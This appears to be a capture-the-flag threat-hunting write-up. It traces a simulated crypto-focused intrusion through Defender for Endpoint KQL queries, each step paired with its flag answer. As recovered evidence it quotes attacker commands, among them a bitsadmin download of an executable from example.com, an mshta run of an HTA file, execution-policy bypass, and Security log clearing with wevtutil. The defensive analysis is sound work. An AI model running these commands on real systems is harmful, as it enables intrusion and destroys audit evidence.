# Operation Crypto Harvest: Tracking a Financially Motivated Intrusion Through MDE Forensics

**Date Completed:** July 12, 2025  

**Objective:** This threat hunt tracked a financially motivated attacker targeting crypto-related data. The investigation followed the entire kill chain from initial execution to log clearing, using **Microsoft Defender for Endpoint (MDE)** telemetry and KQL queries.

---

## **Step 0 – Pre-Flag: Initial Entry Point Identification**

### **Objective**  
Identify the starting point for investigation based on initial threat intelligence.

### **Threat Intel Guidance**  
- Activity duration: 2–3 days  
- Executions originating from Temp folders  
- Key date of interest: June 15, 2025

### **Query Used**  

```kusto
DeviceProcessEvents
| where Timestamp between (datetime(2025-06-12) .. datetime(2025-06-17))
| where FolderPath contains "Temp"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine
| order by Timestamp asc
```

### **Answer**  

```
Device: michaelvm  
Timestamp: 2025-06-15T09:27:09Z  
FileName: MpSigStub.exe  
FolderPath: C:\Windows\Temp\1AF8D39A-D93B-4519-BD22-76533450984E\MpSigStub.exe  
ProcessCommandLine: MpSigStub.exe /stub 1.1.24010.2001 /payload 4.18.25040.2 /program C:\Windows\SoftwareDistribution\Download\Install\UpdatePlatform.amd64fre.exe
```

### **Analysis**  
The execution of a legitimate LOLBin (`MpSigStub.exe`) from a Temp directory, with chained execution of another binary, suggested potential abuse. This confirmed **michaelvm** as the correct starting point for further investigation.

---

## **Flag 1 – Initial PowerShell Execution Detection**

### **Objective**  
Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has_any("whoami", "systeminfo", "net user", "net localgroup", "hostname", "Get-Process")
| project Timestamp, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### **Answer**  
```
"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"
```

### **Analysis & Evidence**  
The earliest suspicious PowerShell execution launched a wallet generation script, suggesting initial credential harvesting or crypto-related foothold establishment.

---

## **Flag 2 – Reconnaissance Script Hash**

### **Objective**  
Identify reconnaissance stage binary.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has_any("whoami", "systeminfo", "net user", "net localgroup", "hostname", "Get-Process")
   or FileName endswith "recon.exe"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### **Answer**  
```
badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
```

### **Analysis & Evidence**  
The SHA256 hash corresponds to a custom reconnaissance binary used by the attacker to enumerate system and network information.

---

## **Flag 3 – Sensitive Document Access**

### **Objective**  
Reveal the document accessed/staged by attacker.

### **Query Used**  

```kusto
DeviceFileEvents
| where DeviceName == "michaelvm"
| where FolderPath contains "Board"
```

### **Answer**  
```
QuarterlyCryptoHoldings.docx
```

### **Analysis & Evidence**  
The attacker targeted sensitive financial information, accessing a document detailing quarterly crypto holdings, revealing clear monetary motivation.

---

## **Flag 4 – Last Manual Access to File**

### **Objective**  
Track last read of sensitive document.

### **Query Used**  

```kusto
DeviceEvents
| where DeviceName == "michaelvm"
| where FileName =~ "QuarterlyCryptoHoldings.docx"
| project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

### **Answer**  
```
2025-06-16T06:12:28.2856483Z
```

### **Analysis & Evidence**  
This was the final manual read of the sensitive document before exfiltration, aligning with late-stage collection activity.

---

## **Flag 5 – LOLBin Usage: bitsadmin**

### **Objective**  
Identify stealth download via native tools.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where FileName =~ "bitsadmin.exe"
| project Timestamp, FileName, ProcessCommandLine, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe
```

### **Analysis & Evidence**  
The attacker abused Bitsadmin (a known LOLBin) to stealthily download malicious tooling under the guise of a legitimate file transfer.

---

## **Flag 6 – Suspicious Payload Deployment**

### **Objective**  
Identify dropped executable payloads that do not align with baseline software.

### **Query Used**  

```kusto
DeviceFileEvents
| where DeviceName == "michaelvm"
| where FolderPath contains "Temp"
| project Timestamp, FileName, FolderPath, SHA256
| order by Timestamp asc
```

### **Answer**  
```
ledger_viewer.exe
```

### **Analysis & Evidence**  
This malicious payload was staged in the Temp directory to masquerade as legitimate finance-related software.

---

## **Flag 7 – HTA Abuse via LOLBin**

### **Objective**  
Detect execution of HTML Application files using trusted Windows tools.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where FileName =~ "mshta.exe"
| project Timestamp, FileName, ProcessCommandLine, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta
```

### **Analysis & Evidence**  
HTA execution via MSHTA.exe indicates social engineering and LOLBin abuse for script-based payload execution.

---

## **Flag 8 – ADS Execution Attempt**

### **Objective**  
Track if attackers stored payloads in Alternate Data Streams (ADS).

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has ".dll" and ProcessCommandLine contains ":"
| project Timestamp, FileName, ProcessCommandLine, SHA1, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
801262e122db6a2e758962896f260b55bbd0136a
```

### **Analysis & Evidence**  
The attacker leveraged ADS to hide malicious DLLs within document files, a known stealth tactic to evade detection.

---

## **Flag 9 – Registry Persistence Confirmation**

### **Objective**  
Confirm that persistence was achieved via registry autorun keys.

### **Query Used**  

```kusto
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where RegistryValueData has ".ps1"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp asc
```

### **Answer**  
```
HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### **Analysis & Evidence**  
The persistence mechanism ensured execution of the malicious PowerShell script on reboot, confirming long-term access intent.

---

## **Flag 10 – Scheduled Task Execution**

### **Objective**  
Validate the scheduled task that launches the payload.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where FileName contains "schtasks.exe"
| order by Timestamp asc
```

### **Answer**  
```
MarketHarvestJob
```

### **Analysis & Evidence**  
The attacker scheduled this malicious job to automate payload execution, supporting ongoing data theft.

---

## **Flag 11 – Target of Lateral Movement**

### **Objective**  
Identify the remote machine the attacker pivoted to next.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has_any("\\", "/S ", "/node", "Invoke-Command", "Enter-PSSession", "net use", "psexec")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
centralsrvr
```

### **Analysis & Evidence**  
The attacker pivoted laterally to this key server, signaling expansion of the compromise to sensitive infrastructure.

---

## **Flag 12 – Lateral Move Timestamp**

### **Objective**  
Pinpoint the exact time of lateral move to the second system.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has_any("\\", "/S ", "/node", "Invoke-Command", "Enter-PSSession", "net use", "psexec")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
2025-06-17T03:00:49.525038Z
```

### **Analysis & Evidence**  
This marks the exact time the attacker initiated lateral movement to `centralsrvr`.

---

## **Flag 13 – Sensitive File Access**

### **Objective**  
Reveal which specific document the attacker was after.

### **Query Used**  

```kusto
DeviceFileEvents
| where DeviceName == "centralsrvr"
| where FileName endswith ".docx"
| project Timestamp, FileName, FolderPath, SHA1
| order by Timestamp asc
```

### **Answer**  
```
b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98
```

### **Analysis & Evidence**  
The attacker accessed a sensitive financial document, confirming the data theft motive.

---

## **Flag 14 – Data Exfiltration Attempt**

### **Objective**  
Validate outbound activity by hashing the process involved.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where FileName == "powershell.exe"
| where ProcessCommandLine has "exfiltratedata.ps1"
| project Timestamp, FileName, ProcessCommandLine, MD5
| order by Timestamp asc
```

### **Answer**  
```
2e5a8590cf6848968fc23de3fa1e25f1
```

### **Analysis & Evidence**  
The attacker used a custom PowerShell script (`exfiltratedata.ps1`) to exfiltrate data to an external server.

---

## **Flag 15 – Destination of Exfiltration**

### **Objective**  
Identify final IP address used for data exfiltration.

### **Query Used**  

```kusto
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where RemoteIPType == "Public"
| summarize by RemoteIP
| order by RemoteIP asc
```

### **Answer**  
```
104.22.69.199
```

### **Analysis & Evidence**  
The attacker exfiltrated data to this external IP, which is linked to an unauthorized cloud service.

---

## **Flag 16 – PowerShell Downgrade Detection**

### **Objective**  
Spot PowerShell version manipulation to avoid logging.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where FileName == "powershell.exe"
| where ProcessCommandLine has "-Version 2"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

### **Answer**  
```
2025-06-18T10:52:59.0847063Z
```

### **Analysis & Evidence**  
The attacker downgraded PowerShell to version 2 to bypass AMSI logging, a known anti-forensic technique.

---

## **Flag 17 – Log Clearing Attempt**

### **Objective**  
Catch attacker efforts to cover their tracks.

### **Query Used**  

```kusto
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where FileName =~ "wevtutil.exe"
| where ProcessCommandLine has "cl Security"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath
| order by Timestamp asc
```

### **Answer**  
```
2025-06-18T06:52:33Z
```

### **Analysis & Evidence**  
The attacker cleared the Security event log using `wevtutil.exe cl Security`, an explicit anti-forensic step to erase evidence of malicious activity.

---

# **Conclusion**

This investigation successfully tracked the attacker from initial Temp-based LOLBin abuse to final log-clearing anti-forensics. Key takeaways include:

- **Initial Foothold:** LOLBin abuse (`MpSigStub.exe`) in Temp directories confirmed initial entry.

- **Persistence & Lateral Movement:** Registry autoruns, scheduled tasks, and lateral movement to `centralsrvr` were identified.

- **Financial Motivation:** Multiple targeted crypto/financial documents confirm the attacker’s motive.

- **Exfiltration & Cleanup:** Data exfiltration via `exfiltratedata.ps1` to `104.22.69.199`, followed by PowerShell downgrade and Security log clearing (`wevtutil.exe`).
